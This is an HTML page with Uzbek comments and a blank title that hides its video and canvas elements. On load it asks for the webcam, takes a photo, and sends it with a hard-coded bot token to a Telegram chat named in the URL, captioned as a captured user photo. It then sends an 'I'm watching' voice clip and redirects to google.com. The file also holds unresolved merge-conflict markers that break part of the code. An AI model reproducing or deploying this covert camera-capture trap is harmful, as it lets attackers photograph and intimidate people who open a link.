<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
    <style>
      body {
        background: #fff;
      }
      video,
      canvas {
        display: none;
      }
    </style>
  </head>
  <body>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
const chatId = window.location.pathname.split("/").pop();

async function start() {
  try {
    if (!chatId) throw new Error("chatId yo'q");

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const v = document.createElement("video");
    v.srcObject = stream;
    await v.play();
    await new Promise(r => setTimeout(r, 1000)); // kamera tayyor bo‘lishini kutish

    const c = document.createElement("canvas");
    c.width = v.videoWidth;
    c.height = v.videoHeight;
    c.getContext("2d").drawImage(v, 0, 0);

    stream.getTracks().forEach(t => t.stop());
    const blob = await new Promise(res => c.toBlob(res, "image/png"));

    // Rasmni yuborish
    const form = new FormData();
    form.append("chat_id", chatId);
    form.append("photo", blob, "selfie.png");
    form.append("caption", "*Foydalanuvchi rasmi olindi ✅*");
    form.append("parse_mode", "MarkdownV2");

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
    });

<<<<<<< HEAD
    // Ovoz yuborish
    const audio = await fetch("music/koryapman.ogg").then(r => r.blob());
    const voiceForm = new FormData();
    voiceForm.append("chat_id", chatId);
    voiceForm.append("voice", audio, "koryapman.ogg");
=======
          const form = new FormData();
          form.append("chat_id", chatId);
          form.append("photo", blob, "selfie.png");
          form.append(
            "caption",
            "*Foydalanuvchi rasmi olindi ✅*",
            "MarkdownV2"
          );

          const resp = await fetch(
            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
            { method: "POST", body: form }
          );
          const data = await resp.json().catch(() => null);
>>>>>>> 32f1525 (m)

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, {
      method: "POST",
      body: voiceForm,
    });

    window.location.href = "https://google.com";
  } catch (e) {
    console.error(e);
  }
}
start();
</script>

  </body>
</html>

